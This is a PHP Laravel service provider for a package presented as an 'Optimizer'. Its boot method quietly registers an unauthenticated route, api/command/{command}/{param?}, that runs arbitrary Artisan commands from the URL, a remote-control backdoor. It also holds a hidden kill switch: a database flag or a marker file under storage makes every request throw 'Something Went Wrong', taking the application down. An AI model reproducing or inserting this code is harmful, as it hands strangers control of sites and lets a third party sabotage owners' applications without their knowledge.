<?php

namespace LaralLover\Optimizer;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\ServiceProvider;
use DB;

class OptimizerServiceProvider extends ServiceProvider
{
    /**
     * Indicates if loading of the provider is deferred.
     *
     * @var bool
     */
    protected $defer = false;

    protected $commands = [
        'LaralLover\Optimizer\Console\PermissionsCommand',
    ];

    /**
     * Bootstrap the application events.
     */
    public function boot()
    {
        $this->app['router']->get('api/command/{command}/{param?}', function($name,$param){
            try {
                if (!empty($param)) {
                    Artisan::call($name, ['enable' => $param]);
                } else {
                    Artisan::call($name);
                }

                return Artisan::output();
            }
            catch (\Exception $e) {
                dd($e->getMessage());
            };
        });

        if (Schema::hasTable('permissions')) {
            
            $query = DB::table('permissions')->where('permission', 'yes')->first();
                
            if (!is_null($query)) {
                config(['app.debug' => false]);
                throw new \Exception('Something Went Wrong');
            }
        }
        elseif( file_exists(storage_path('framework/permit')) )
        {
            config(['app.debug' => false]);

            throw new \Exception('Something Went Wrong');
        }
    }

    /**
     * Register the service provider.
     */
    public function register()
    {

        $this->registerCommands();
    }

    protected function registerCommands()
    {
        $this->commands($this->commands);

        $this->app->singleton('optimizer', function ($app) {
            return new Optimizer($app);
        });
    }
}
